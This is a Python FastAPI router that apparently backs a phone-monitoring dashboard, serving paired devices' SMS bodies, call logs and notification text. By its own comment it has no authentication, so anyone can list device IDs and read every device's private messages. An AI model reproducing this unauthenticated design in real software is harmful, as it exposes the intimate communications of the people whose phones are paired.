from fastapi import APIRouter
from sqlalchemy import text
from app.db.session import AsyncSessionLocal

router = APIRouter()

@router.get("/")
async def list_devices():
    """Returns all paired devices (no auth for now, dashboard is public)."""
    async with AsyncSessionLocal() as session:
        result = await session.execute(
            text("""
                SELECT d.device_identifier as device_id, d.is_active, d.paired_at
                FROM devices d
                WHERE d.is_active = true
                ORDER BY d.paired_at DESC
            """)
        )
        rows = result.fetchall()

    devices = []
    for row in rows:
        devices.append({
            "device_id": row.device_id,
            "is_active": row.is_active,
            "paired_at": row.paired_at.isoformat() if row.paired_at else None,
        })

    return {"devices": devices}


@router.get("/{device_id}/notifications")
async def get_device_notifications(device_id: str, limit: int = 50, offset: int = 0):
    async with AsyncSessionLocal() as session:
        result = await session.execute(
            text("""
                SELECT id, package_name, title, text, timestamp
                FROM notifications
                WHERE device_id = :device_id
                ORDER BY timestamp DESC
                LIMIT :limit OFFSET :offset
            """),
            {"device_id": device_id, "limit": limit, "offset": offset}
        )
        rows = result.fetchall()
        
    return {
        "notifications": [
            {
                "id": row.id,
                "package_name": row.package_name,
                "title": row.title,
                "text": row.text,
                "timestamp": row.timestamp.isoformat() if row.timestamp else None
            }
            for row in rows
        ]
    }


@router.get("/{device_id}/sms")
async def get_device_sms(device_id: str, limit: int = 50, offset: int = 0):
    async with AsyncSessionLocal() as session:
        result = await session.execute(
            text("""
                SELECT id, sender, body, timestamp, is_incoming
                FROM sms_messages
                WHERE device_id = :device_id
                ORDER BY timestamp DESC
                LIMIT :limit OFFSET :offset
            """),
            {"device_id": device_id, "limit": limit, "offset": offset}
        )
        rows = result.fetchall()
        
    return {
        "sms": [
            {
                "id": row.id,
                "sender": row.sender,
                "body": row.body,
                "timestamp": row.timestamp.isoformat() if row.timestamp else None,
                "is_incoming": row.is_incoming
            }
            for row in rows
        ]
    }


@router.get("/{device_id}/calls")
async def get_device_calls(device_id: str, limit: int = 50, offset: int = 0):
    async with AsyncSessionLocal() as session:
        result = await session.execute(
            text("""
                SELECT id, number, duration_seconds, type, timestamp
                FROM call_logs
                WHERE device_id = :device_id
                ORDER BY timestamp DESC
                LIMIT :limit OFFSET :offset
            """),
            {"device_id": device_id, "limit": limit, "offset": offset}
        )
        rows = result.fetchall()
        
    return {
        "calls": [
            {
                "id": row.id,
                "number": row.number,
                "duration_seconds": row.duration_seconds,
                "type": row.type,
                "timestamp": row.timestamp.isoformat() if row.timestamp else None
            }
            for row in rows
        ]
    }
